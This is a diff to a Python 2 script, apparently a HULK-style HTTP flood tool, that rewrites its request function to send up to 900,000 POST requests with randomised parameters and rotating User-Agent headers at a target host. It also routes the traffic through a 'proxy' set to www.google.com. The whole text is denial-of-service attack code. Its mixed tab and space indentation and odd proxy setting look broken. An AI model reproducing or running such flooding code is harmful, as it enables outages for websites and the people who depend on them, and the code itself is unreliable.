@@ -79,16 +79,19 @@ def httpcall(url):
 	useragent_list()
 	referer_list()
 	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-		conn = httplib.HTTPSConnection("www.google.com", 443)
+	request = urllib2.Request(url + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request.add_header('User-Agent', random.choice(headers_useragents))
+	request.add_header('Host',host)
+	request.add_header('Content-type', 'application/x-www-form-urlencoded')
+        request.get_method = lambda: "POST"
+        proxy_support = urllib2.ProxyHandler({"https": "https://www.google.com"})
+        opener = urllib2.build_opener(proxy_support)
+        urllib2.install_opener(opener)
 	
 	try:
 		for i in range(900000):
 		
-			conn.request("GET", 'http://'+host+'/')
+			urllib2.urlopen(request)
 	except socket.error as e:
 			#print e.code
 			set_flag(1)
@@ -96,8 +99,8 @@ def httpcall(url):
 			code=500
 	else:
 			inc_counter()
-			conn.request("GET", 'http://'+host+'/')
-	return(code)		
+			urllib2.urlopen(request)
+	return(code)
 
 	
 #http caller thread 
